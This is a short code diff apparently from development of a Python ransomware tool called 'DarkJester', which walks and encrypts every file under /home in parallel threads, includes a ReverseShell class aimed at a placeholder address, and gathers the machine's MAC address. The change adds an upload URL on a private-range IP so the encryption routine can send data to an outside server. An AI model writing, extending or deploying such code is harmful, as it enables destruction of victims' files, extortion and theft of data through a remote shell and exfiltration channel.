@@ -89,12 +89,12 @@ class DarkJester:
         except (PermissionError, OSError) as e:
             print(f"Error encrypting {filepath}: {e}")
 
-    def encrypt_directory(self, directory, max_threads=10):
+    def encrypt_directory(self, directory, server_url, max_threads=10):
         with ThreadPoolExecutor(max_threads) as executor:
             for root, _, files in os.walk(directory):
                 for file in files:
                     filepath = os.path.join(root, file)
-                    executor.submit(self.encrypt_file, filepath)
+                    executor.submit(self.encrypt_file, filepath, server_url)
     
     def get_mac_address(self):
         result = sp.run(['ip', 'addr'], capture_output=True, text=True)
@@ -182,6 +182,7 @@ class ReverseShell:
 if __name__ == "__main__":
     jester = DarkJester()
     shell = ReverseShell('127.0.0.1', 1234) # Modify this
+    server_url = "http://192.168.227.174:5000/upload"
     # shell.daemonize()
     user_directory = "/home"
     if os.path.exists(user_directory):
